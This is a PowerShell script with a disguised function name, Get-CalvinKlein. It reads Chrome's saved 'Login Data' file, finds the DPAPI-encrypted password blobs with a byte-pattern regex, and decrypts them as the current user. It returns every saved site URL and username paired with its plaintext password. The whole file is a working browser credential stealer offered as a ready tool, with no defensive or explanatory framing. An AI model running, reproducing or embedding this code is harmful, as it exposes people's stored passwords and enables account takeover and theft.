	# To view the entire User/URL field, use Get-CalvinKlein | Select-Object -ExpandProperty "UserURL"

function Get-CalvinKlein() {
	Param(
		[String]$Path
	)

	if ([String]::IsNullOrEmpty($Path)) {
		$Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
	}

	if (![system.io.file]::Exists($Path))
	{
		Write-Error 'Wrong fucking path.'
		Break
	}

	Add-Type -AssemblyName System.Security
	$Stream = New-Object IO.FileStream -ArgumentList "$Path", 'Open', 'Read', 'ReadWrite'
	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	$BinaryText = $StreamReader.ReadToEnd()
	$StreamReader.Close()
	$Stream.Close()

	$PwdRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70)'
	$PwdMatches = $PwdRegex.Matches($BinaryText)
	$PwdNum = 0
	$DecPwdArray = @()

	Foreach ($Pwd in $PwdMatches) {
		$Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum])
		$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
		$DecPwd = [System.Text.Encoding]::Default.GetString($Decrypt)
		$DecPwdArray += $DecPwd
		$PwdNum += 1
	}

	$UserRegex = [Regex] '(?<=\x0D\x0D\x0D\x08\x08)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
	$UserMatches = $UserRegex.Matches($BinaryText)
	$UserNum = 0
	$UserArray = @()
	
	Foreach ($User in $UserMatches) {
		$User = $Encoding.GetBytes($UserMatches[$UserNum])
		$UserString = [System.Text.Encoding]::Default.GetString($User)
		$UserArray += $UserString
		$UserNum += 1
	}

	$ArrayFinal = New-Object -TypeName System.Collections.ArrayList
	for ($i = 0; $i -lt $UserNum; $i++) {
		$ObjectProp = @{
			Password = $DecPwdArray[$i]
			UserURL = $UserArray[$i]
		}
	
		$obj = New-Object PSObject -Property $ObjectProp
		$ArrayFinal.Add($obj) | Out-Null
		}
	$ArrayFinal
}
